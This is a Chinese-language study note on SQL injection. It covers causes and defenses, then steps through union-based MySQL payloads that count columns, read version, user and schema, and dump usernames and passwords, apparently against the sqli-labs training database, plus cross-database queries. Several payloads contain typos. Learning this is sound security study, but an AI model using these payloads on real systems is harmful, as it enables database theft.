# sql注入--基础和常规思路

## 一.形成原因及危害和防御

### 1.1 原因

SQL注入（SQL Injection）是一种常见的Web安全漏洞，形成的主要原因是web应用程序在接收相关数据参数时未做好过滤，将其直接带入到数据库中查询，导致攻击者可以拼接执行构造的SQL语句。那什么是SQL了？结构化查询语言（Structured Query Language，缩写：SQL），是一种关系型数据库查询的标准编程语言，用于存取数据以及查询、更新、删除和管理关系型数据库（即SQL是一种数据库查询语言）

即：注入产生的原因是后台服务器在接收相关参数时未做好过滤直接带入到数据库中查询，导致可以拼接执行构造的SQL语句

- 用户提交(主动或被动)的数据内容被带入到数据库
- 程序没有对用户提交内容做合理的处理,导致用户可以改变原有sq|语义或添加额外的sq|语句

### 1.2 危害

SQL注入漏洞对于数据安全的影响：

- **数据库信息泄漏**：数据库中存放的用户的隐私信息的泄露。
- **网页篡改**：通过操作数据库对特定网页进行篡改。
- **网站被挂马**，**传播恶意软件**：修改数据库一些字段的值，嵌入网马链接，进行挂马攻击。
- **数据库被恶意操作**：数据库服务器被攻击，数据库的系统管理员帐户被窜改。
- **服务器被远程控制，被安装后门：**经由数据库服务器提供的操作系统支持，让黑客得以修改或控制操作系统。
- **破坏硬盘数据**，**瘫痪全系统**。

### 1.3 sql注入防范

解决SQL注入问题的关键是对所有可能来自用户输入的数据进行严格的检查、对数据库配置使用最小权限原则。通常修复使用的方案有：

**代码层面**：

- 对输入进行严格的转义和过滤

- 使用参数化（Parameterized）：目前有很多ORM框架会自动使用参数化解决注入问题，但其也提供了"拼接"的方式,所以使用时需要慎重!

- PDO预处理 (Java、PHP防范推荐方法：)

  > 没有进行PDO预处理的SQL，在输入SQL语句进行执行的时候，web服务器自己拼凑SQL的时候有可能会把危险的SQL语句拼凑进去。但如果进行了PDO预处理的SQL，会让MYSQL自己进行拼凑，就算夹带了危险的SQL语句，也不会进行处理只会当成参数传进去，而不是以拼接进SQL语句传进去，从而防止了SQL注入

**网络层面**：

- 通过WAF设备启用防SQL Inject注入策略（或类似防护系统）
- 云端防护（如阿里云盾）

## 二.mysql注入一般思路

1. 寻找注入点
2. 判断注入类型和闭合方式。
3. 验证漏洞
4. 判断列数和回显位
5. 取数据，使用sql语句获取数据库版本，名字，当前用户，权限，列名，表名，数据

## 三.常规注入方法

### 3.1 寻找注入点

寻找**用户可以控制输入的内容且输入内容可以被拼接成sql语句执行后返回数据**的地方，交互点一般是搜索栏、留言版、登入/注册页面、以及最利于观察的搜索栏的地址，如果类似于http//www.xxx.com/index.phpid=1这种很大程度存在注入当然有些注入点不会这么一眼看出会有些比较复杂例如http://www.xxx.com:50006/index.phpx=home&c=View&a=index&aid=9 这样的地址其实也可能存在注入。可以先改变参数观察是否报错和响应数据。

### 3.2 判断注入类型和闭合方式

**注入类型**由源码决定的

> #数字型
>
> select * from admin where id=1
>
> #字符型
>
> select * from admin where id='1'


尝试id=1 and 1=1 和id=1 and 1=2,若两次返回数据一样，可以判断为字符型，否则为数字型。因为字符型有符号进行闭合可能会因为对输入的字符进行了截断并转换了类型，造成1 and 1=2在字符类型中会返回user_id为1的查询结果或者无回显。如果为数字型，那么and后面的结果会影响回显结果

数字型：

> select * from admin where id=1 and 1=1 回显id=1结果
>
> select * from admin where id=1 and 1=2 1=2不成立，无回显

字符型

> select * from admin where id='1 and 1=1' 截断回显id=1结果,不截断无回显
>
> select * from admin where id='1 and 1=2' 截断回显id=1结果,不截断无回显

如果是字符型需要判断闭合方式，是数字型则跳过这一步。

使用转义符（\）判段闭合符号，

> 原理，当闭合字符遇到转义字符时，会被转义，那么没有闭合符的语句就不完整了，就会报错，通过报错信息我们就可以推断出闭合符。
>
> 分析报错信息：看\斜杠后面跟着的字符，是什么字符，它的闭合字符就是什么，若是没有，就为数字型。

**常见的闭合方式有 ’，"， ')，")**  

**常见的注释符号有 ‘--+’，‘#’， ‘%23’**

单引号闭合 **‘** ：



![](https://cdn.jsdelivr.net/gh/halcyon098/study-img/study-images/f054d0f23ad109ccb22787b2185e7b12_MD5.png)

数字型：

![image-20240221172452933](https://cdn.jsdelivr.net/gh/halcyon098/study-img/study-images/62d9fd0cd8950145f5e5177181b9e911_MD5.png)

单引号加括号 **')** ：

![image-20240221172656274](https://cdn.jsdelivr.net/gh/halcyon098/study-img/migrated/91e55077be6e0b1cc4acd450f34a8c3c.png)

### 3.3 判断回显位置

使用**order by（排序字段）**语句判断列数为后面联合查询做准备，因为联合查询列数不对会报错

> select * from admin where id=1' order by 3 --+

[图片缺失：原路径 C:\Users\丁明明\AppData\Roaming\Typora\typora-user-images\image-20240221174352524.png，仓库内无原图，需从旧电脑找回]

[图片缺失：原路径 C:\Users\丁明明\AppData\Roaming\Typora\typora-user-images\image-20240221174437160.png，仓库内无原图，需从旧电脑找回]

由上图可知字段数为3。使用联合查询判断回显位置 ，union字段

> UNION 的含义是“联合，并集，结合”，在MySQL中可以将多个查询语句的结果合并成一个结果集
>
> 若容许重复的值，请使用 UNION ALL

[图片缺失：原路径 C:\Users\丁明明\AppData\Roaming\Typora\typora-user-images\image-20240221175139170.png，仓库内无原图，需从旧电脑找回]

当union原语句不成立时就会只返回后面语句的结果，由此判断页面回显的位置

### 3.4 取数据

#### 准备知识：

**常用函数：**

| 函数/语句                    | 功能                           |
| ---------------------------- | ------------------------------ |
| user()                       | 当前用户名                     |
| database()                   | 当前所用数据库                 |
| current_user()               | 当前用户名（可以用来查看权限） |
| version()                    | 数据库的版本                   |
| @@datadir                    | 数据库的路径                   |
| load_file()                  | 读文件操作                     |
| into outfile()/into dumpfile | 写文件操作                     |

> sql注入读写文件的根本条件：
>
> 1、数据库允许导入导出（secure_file_priv）:
>
> show variables like "secure_file_priv";  #secure_file_prive直接在my.ini文件里设置即可
>
> 2、当前用户是否对文件具有读写权限（File_priv）:
>
> 查看当前用户 :
>
> select current_user();
>
> 查看当前用户是否具有读写权限： 
>
> select File_priv from mysql.user where user='root' and host='localhost';

**字符串链接函数:**

concat(str1,str2,...)——没有分隔符地链接字符串

concat_ws(separator,str1,str2,...)——含有分隔符地链接字符串

group_concat(str1,str2,...)——链接一个组的全部字符串，并以逗号分隔每一条数据

**MYSQL中的information_schema**：

> 在 MySQL中，把 information_schema 看做是一个数据库，确切说是信息数据库。其中保存着关于MySQL服务器所维护的全部其余数据库的信息。如数据库名，数据库的表，表栏的数据类型与访问权限等。在INFORMATION_SCHEMA中，有数个只读表。它们其实是视图，而不是基本表，所以，你将没法看到与之相关的任何文件。



> information_schema数据库表说明:
>
> SCHEMATA表：提供了当前mysql实例中全部数据库的信息。是show databases的结果取之此表。
>
> TABLES表：提供了关于数据库中的表的信息（包括视图）。详细表述了某个表属于哪一个schema，表类型，表引擎，建立时间等信息。是show tables from schemaname的结果取之此表。
>
> COLUMNS表：提供了表中的列信息。详细表述了某张表的全部列以及每一个列的信息。是show columns from schemaname.tablename的结果取之此表。
>
> STATISTICS表：提供了关于表索引的信息。是show index from schemaname.tablename的结果取之此表。
>
> USER_PRIVILEGES（用户权限）表：给出了关于全程权限的信息。该信息源自mysql.user受权表。是非标准表。
>
> SCHEMA_PRIVILEGES（方案权限）表：给出了关于方案（数据库）权限的信息。该信息来自mysql.db受权表。是非标准表。
>
> TABLE_PRIVILEGES（表权限）表：给出了关于表权限的信息。该信息源自mysql.tables_priv受权表。是非标准表。
>
> COLUMN_PRIVILEGES（列权限）表：给出了关于列权限的信息。该信息源自mysql.columns_priv受权表。是非标准表。
>
> CHARACTER_SETS（字符集）表：提供了mysql实例可用字符集的信息。是SHOW CHARACTER SET结果集取之此表。
>
> COLLATIONS表：提供了关于各字符集的对照信息。
>
> COLLATION_CHARACTER_SET_APPLICABILITY表：指明了可用于校对的字符集。这些列等效于SHOW COLLATION的前两个显示字段。
>
> TABLE_CONSTRAINTS表：描述了存在约束的表。以及表的约束类型。
>
> KEY_COLUMN_USAGE表：描述了具备约束的键列。
>
> ROUTINES表：提供了关于存储子程序（存储程序和函数）的信息。此时，ROUTINES表不包含自定义函数（UDF）。名为“mysql.proc name”的列指明了对应于INFORMATION_SCHEMA.ROUTINES表的mysql.proc表列。
>
> VIEWS表：给出了关于数据库中的视图的信息。须要有show views权限，不然没法查看视图信息。
>
> TRIGGERS表：提供了关于触发程序的信息。必须有super权限才能查看该表



#### 数据库版本

看是否符合information schemai查询 version()

> select * from admin where id=-1' union select 1,version(),3 --+
>
> 回显结果：5.7.26

#### 数据库用户

看是否符合ROOT型注入攻击 user()

> select * from admin where id=-1' union select 1,user(),3 --+
>
> root@localhost
>
> root类型攻击-猜解数据，文件读写，跨库查询

#### 当前操作系统

看是否支持大小写或文件路径选择 @@version_compile_os()

#### 数据库名

为后期查询表名和列名做准备 database()

> select * from admin where id=-1'  union select 1,database(),3 --+
>
> 回显结果：security

#### 获取当前数据库下面的表名信息：

> select * from admin where id=-1'   union select 1,group_concat(table_name),3 from information_schema.tables where table_schema='security' --+
>
> 回显结果：emails,referers,uagents,users

information_schema.tables表示该数据库下的tables表，点表示下一级。where后面是条件，group_concat()是将查询到结果连接起来。如果不用group_concat查询到的只有user。

该语句的意思是查询information_schema数据库下的tables表里面且table_schema字段内容是security的所有table_name的内容。

#### 获取表名syadminuser的列名信息：

> select * from admin where id=-1' union select 1,group_concat(columns_name),3 from information_schema.columns where table_name='users' --+
>
> 回显结果：user_id,first_name,last_name,user,password,avatar,last_login,failed_login,USER,CURRENT_CONNECTIONS,TOTAL_CONNECTIONS,id,username,password,level,id,username,password

#### 获取指定数据：

> select * from admin where id=-1' union select 1,2,group_concat(username,':',password) from users --+
>
> 回显结果：:Dumb:Dumb,Angelina:I-kill-you,Dummy:p@ssword,secure:crappy,stupid:stupidity,superman:genious,batman:mob!le,admin:admin,admin1:admin1,admin2:admin2,admin3:admin3,dhakkan:dumbo,admin4:admin4



## 四. **跨库注入**

**实现当前网站跨库查询其他数据库对应网站的数据**

- 获取当前mysq1下的所有数据库名
  UNION SELECT schema_name,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17
  from information_schema.schmata
- 获取数据库名xhcms下的表名信息
  UNION SELECT table_name,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17
  from information schema.tables where table_schema=‘xhcms’
- 获取数据库名xhcms下的表manage下的列名信息：
  UNION SELECT column_name,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17
  from information schema.columns where table_name='manage’and
  table schema='xhcms
- 获取指定数据：
  UNI0 N SELECT user,password,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17
  from xhcms
